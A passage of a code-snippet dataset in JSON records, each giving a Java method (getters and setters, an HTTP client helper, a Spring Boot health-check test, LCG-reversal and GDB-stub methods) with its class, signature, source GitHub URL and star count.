"https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57422, "method_name": "setCount", "class_name": "WebLimit", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setCount(int count) {\n            this.count = count;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57423, "method_name": "getLimit", "class_name": "WebLimit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getLimit() {\n            return limit;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57424, "method_name": "setLimit", "class_name": "WebLimit", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setLimit(int limit) {\n            this.limit = limit;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57425, "method_name": "getStatus", "class_name": "WebLimit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getStatus() {\n            return status;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57426, "method_name": "setStatus", "class_name": "WebLimit", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setStatus(int status) {\n            this.status = status;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57427, "method_name": "getCounter", "class_name": "WebRequestLastLogon", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getCounter() {\n            return counter;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57428, "method_name": "setCounter", "class_name": "WebRequestLastLogon", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setCounter(int counter) {\n            this.counter = counter;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57429, "method_name": "getDatetime", "class_name": "WebRequestLastLogon", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "        public Date getDatetime() {\n            return datetime;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57430, "method_name": "setDatetime", "class_name": "WebRequestLastLogon", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setDatetime(Date datetime) {\n            this.datetime = datetime;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57431, "method_name": "getIp", "class_name": "WebRequestLastLogon", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getIp() {\n            return ip;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57432, "method_name": "setIp", "class_name": "WebRequestLastLogon", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setIp(String ip) {\n            this.ip = ip;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57433, "method_name": "getWebLimit", "class_name": "WebRequestLimit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "WebLimit", "snippet": "        public WebLimit getWebLimit() {\n            return webLimit;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57434, "method_name": "setWebLimit", "class_name": "WebRequestLimit", "params": ["WebLimit"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setWebLimit(WebLimit webLimit) {\n            this.webLimit = webLimit;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57435, "method_name": "getLastLogon", "class_name": "WebRequestLimit", "params": [], "throws": null, "modifiers": ["public"], "return_type": "WebRequestLastLogon", "snippet": "        public WebRequestLastLogon getLastLogon() {\n            return lastLogon;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57436, "method_name": "setLastLogon", "class_name": "WebRequestLimit", "params": ["WebRequestLastLogon"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setLastLogon(WebRequestLastLogon lastLogon) {\n            this.lastLogon = lastLogon;\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57437, "method_name": "initialize", "class_name": "SettingPanelControl", "params": ["URL", "ResourceBundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(URL location, ResourceBundle resources) {\n        \n        Setting.getStylesheets().add(LightTheme.toString());\n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/SettingPanelControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 57438, "method_name": "modeChange", "class_name": "SettingPanelControl", "params": ["Boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void modeChange(Boolean ModeState){\n        /*\u79fb\u9664\u6240\u6709\u6837\u5f0f\u8868*/\n        Setting.getStylesheets().remove(LightTheme);\n        Setting.getStylesheets().remove(DarkTheme);\n        if(ModeState)\n            Setting.getStylesheets().add(LightTheme.toString());\n        else\n            Setting.getStylesheets().add(DarkTheme.toString());\n        \n    }", "url": "https://raw.githubusercontent.com/fordes123/Subtitles-View/master/src/main/java/org/fordes/subview/controller/SettingPanelControl.java", "stars": "151", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"id": 57439, "method_name": "newInstance", "class_name": "HttpConnection", "params": ["URI"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "HttpConnection", "snippet": "    public static HttpConnection newInstance(URI uri) throws IOException {\n        return new HttpURLConnectionClient(uri);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57440, "method_name": "newSubscriptionInstance", "class_name": "HttpConnection", "params": ["URI"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "HttpConnection", "snippet": "    public static HttpConnection newSubscriptionInstance(URI uri) throws IOException {\n        return new CustomConnectionClient(uri);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57441, "method_name": "setMethod", "class_name": "HttpConnection", "params": ["Method"], "throws": ["ProtocolException"], "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void setMethod(Method method) throws ProtocolException;\n\n    public abstract int getResponseCode() throws IOException;\n\n    public abstract String getResponseString() throws IOException;\n\n    public abstract void execute() throws IOException;\n\n    public abstract void setPayload(String payload);\n\n    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57442, "method_name": "getResponseCode", "class_name": "HttpConnection", "params": [], "throws": ["IOException"], "modifiers": ["public", "abstract"], "return_type": "int", "snippet": "    public abstract int getResponseCode() throws IOException;\n\n    public abstract String getResponseString() throws IOException;\n\n    public abstract void execute() throws IOException;\n\n    public abstract void setPayload(String payload);\n\n    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57443, "method_name": "getResponseString", "class_name": "HttpConnection", "params": [], "throws": ["IOException"], "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "    public abstract String getResponseString() throws IOException;\n\n    public abstract void execute() throws IOException;\n\n    public abstract void setPayload(String payload);\n\n    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57444, "method_name": "execute", "class_name": "HttpConnection", "params": [], "throws": ["IOException"], "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void execute() throws IOException;\n\n    public abstract void setPayload(String payload);\n\n    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57445, "method_name": "setPayload", "class_name": "HttpConnection", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void setPayload(String payload);\n\n    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57446, "method_name": "setPayload", "class_name": "HttpConnection", "params": ["byte"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void setPayload(byte[] payload);\n\n    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57447, "method_name": "setHeader", "class_name": "HttpConnection", "params": ["String", "String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void setHeader(String name, String value);\n\n    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57448, "method_name": "getResponseHeader", "class_name": "HttpConnection", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "    public abstract String getResponseHeader(String name);\n\n    public enum Method {\n        GET,\n        POST,\n        PUT,\n        DELETE,\n        SUBSCRIBE,\n        UNSUBSCRIBE\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57449, "method_name": "setMethod", "class_name": "HttpURLConnectionClient", "params": ["Method"], "throws": ["ProtocolException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void setMethod(Method method) throws ProtocolException {\n            connection.setRequestMethod(method.name());\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57450, "method_name": "getResponseCode", "class_name": "HttpURLConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "int", "snippet": "        public int getResponseCode() throws IOException {\n            return responseCode;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57451, "method_name": "getResponseString", "class_name": "HttpURLConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "String", "snippet": "        public String getResponseString() throws IOException {\n            return response;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57452, "method_name": "execute", "class_name": "HttpURLConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void execute() throws IOException {\n            try {\n                if (payload != null) {\n                    BufferedOutputStream writer =\n                            new BufferedOutputStream(connection.getOutputStream());\n                    writer.write(payload);\n                    writer.flush();\n                    writer.close();\n                }\n                try {\n                    BufferedReader reader =\n                            new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                    String line;\n                    StringBuilder sb = new StringBuilder();\n                    while (null != (line = reader.readLine())) {\n                        sb.append(line);\n                        sb.append(\"\\r\\n\");\n                    }\n                    reader.close();\n                    this.response = sb.toString();\n                } catch (Exception e) {\n                    // it's OK, we have a response code\n                }\n                responseCode = connection.getResponseCode();\n            } finally {\n                connection.disconnect();\n            }\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57453, "method_name": "setPayload", "class_name": "HttpURLConnectionClient", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPayload(String payload) {\n            this.payload = payload.getBytes();\n            connection.setDoOutput(true);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57454, "method_name": "setPayload", "class_name": "HttpURLConnectionClient", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPayload(byte[] payload) {\n            this.payload = payload;\n            connection.setDoOutput(true);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57455, "method_name": "setHeader", "class_name": "HttpURLConnectionClient", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setHeader(String name, String value) {\n            connection.setRequestProperty(name, value);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57456, "method_name": "getResponseHeader", "class_name": "HttpURLConnectionClient", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getResponseHeader(String name) {\n            return connection.getHeaderField(name);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57457, "method_name": "setMethod", "class_name": "CustomConnectionClient", "params": ["Method"], "throws": ["ProtocolException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void setMethod(Method method) throws ProtocolException {\n            this.method = method;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57458, "method_name": "getResponseCode", "class_name": "CustomConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "int", "snippet": "        public int getResponseCode() throws IOException {\n            return code;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57459, "method_name": "getResponseString", "class_name": "CustomConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "String", "snippet": "        public String getResponseString() throws IOException {\n            return response;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57460, "method_name": "execute", "class_name": "CustomConnectionClient", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void execute() throws IOException {\n            int port = uri.getPort() > 0 ? uri.getPort() : 80;\n            Socket socket = new Socket(uri.getHost(), port);\n            PrintWriter writer =\n                    new PrintWriter(new OutputStreamWriter(socket.getOutputStream()), true);\n            BufferedReader reader =\n                    new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // send request\n            writer.print(method.name());\n            writer.print(\" \");\n            writer.print(uri.getPath());\n            writer.print(uri.getQuery().isEmpty() ? \"\" : \"?\" + uri.getQuery());\n            writer.print(\" HTTP/1.1\\r\\n\");\n\n            writer.print(\"Host:\");\n            writer.print(uri.getHost());\n            writer.print(\":\");\n            writer.print(port);\n            writer.print(\"\\r\\n\");\n\n            for (Map.Entry<String, String> pair : headers.entrySet()) {\n                writer.print(pair.getKey());\n                writer.print(\":\");\n                writer.print(pair.getValue());\n                writer.print(\"\\r\\n\");\n            }\n            writer.print(\"\\r\\n\");\n\n            if (payload != null) {\n                writer.print(payload);\n            }\n            writer.flush();\n\n            // receive response\n            StringBuilder sb = new StringBuilder();\n            String line;\n            line = reader.readLine();\n            if (line != null) {\n                String[] tokens = line.split(\" \");\n                if (tokens.length > 2) {\n                    code = Integer.parseInt(tokens[1]);\n                }\n            }\n\n            while (null != (line = reader.readLine())) {\n                if (line.isEmpty()) {\n                    break;\n                }\n                String[] pair = line.split(\":\", 2);\n                if (pair != null && pair.length == 2) {\n                    responseHeaders.put(pair[0].trim(), pair[1].trim());\n                }\n            }\n\n            while (null != (line = reader.readLine())) {\n                sb.append(line);\n                sb.append(\"\\r\\n\");\n            }\n            response = sb.toString();\n            socket.close();\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57461, "method_name": "setPayload", "class_name": "CustomConnectionClient", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPayload(String payload) {\n            this.payload = payload;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57462, "method_name": "setPayload", "class_name": "CustomConnectionClient", "params": ["byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPayload(byte[] payload) {\n            throw new UnsupportedOperationException();\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57463, "method_name": "setHeader", "class_name": "CustomConnectionClient", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setHeader(String name, String value) {\n            if (name != null && value != null) {\n                this.headers.put(name.trim(), value.trim());\n            }\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57464, "method_name": "getResponseHeader", "class_name": "CustomConnectionClient", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getResponseHeader(String name) {\n            return responseHeaders.get(name);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/etc/helper/HttpConnection.java", "stars": "4", "class_props": {"extends": "HttpConnection", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57465, "method_name": "applicationPathShouldNotAffectActuators", "class_name": "JerseyApplicationPathAndManagementPortTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid applicationPathShouldNotAffectActuators() {\n\t\tResponseEntity<String> entity = this.testRestTemplate\n\t\t\t\t.getForEntity(\"http://localhost:\" + this.managementPort + \"/actuator/health\", String.class);\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t\tassertThat(entity.getBody()).contains(\"\\\"status\\\":\\\"UP\\\"\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-jersey/src/test/java/smoketest/jersey/JerseyApplicationPathAndManagementPortTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57466, "method_name": "builder", "class_name": "Program", "params": ["LCG"], "throws": null, "modifiers": ["public", "static"], "return_type": "ProgramBuilder", "snippet": "    public static ProgramBuilder builder(LCG lcg) {\n        return new ProgramBuilder(lcg);\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/Program.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57467, "method_name": "start", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ProgramInstance", "snippet": "    public ProgramInstance start() {\n        return new ProgramInstance(this);\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/Program.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57468, "method_name": "getLcg", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LCG", "snippet": "    public LCG getLcg() {\n        return lcg;\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/Program.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57469, "method_name": "getCalls", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<CallType>", "snippet": "    public List<CallType<?>> getCalls() {\n        return calls;\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/Program.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57470, "method_name": "getConstraints", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Constraint>", "snippet": "    public List<Constraint<?>> getConstraints() {\n        return constraints;\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/Program.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57471, "method_name": "getConstraintIndex", "class_name": "Program", "params": ["Constraint<?>"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getConstraintIndex(Constraint<?> constraint) {\n        return constraintIndices.get(constraint);\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/Program.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57472, "method_name": "getInstructions", "class_name": "Program", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Instruction>", "snippet": "    public List<Instruction> getInstructions() {\n        return instructions;\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/Program.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57473, "method_name": "onServerStart", "class_name": "GdbStub", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onServerStart() {\n        List<Module> loaded = new ArrayList<>(emulator.getMemory().getLoadedModules());\n        Collections.sort(loaded, new Comparator<Module>() {\n            @Override\n            public int compare(Module o1, Module o2) {\n                return (int) (o1.base - o2.base);\n            }\n        });\n        for (Module module : loaded) {\n            System.err.println(\"[0x\" + Long.toHexString(module.base) + \"]\" + module.name);\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57474, "method_name": "send", "class_name": "GdbStub", "params": ["String"], "throws": null, "modifiers": ["final"], "return_type": "void", "snippet": "    final void send(String packet) {\n        sendData(packet.getBytes());\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57475, "method_name": "sendPacket", "class_name": "GdbStub", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void sendPacket(String packet) {\n        lastPacket = packet;\n        send(packet);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57476, "method_name": "makePacketAndSend", "class_name": "GdbStub", "params": ["String"], "throws": null, "modifiers": ["final"], "return_type": "void", "snippet": "    final void makePacketAndSend(String data) {\n        if (log.isDebugEnabled()) {\n            log.debug(\"makePacketAndSend: \" + data);\n        }\n\n        int checksum = 0;\n        data = escapePacketData(data);\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"+\");\n        sb.append(\"$\");\n        for(int i = 0; i < data.length(); i++) {\n            sb.append(data.charAt(i));\n            checksum += (byte) data.charAt(i);\n        }\n        sb.append(\"#\");\n        sb.append(String.format(\"%02x\", checksum & 0xff));\n        sendPacket(sb.toString());\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", 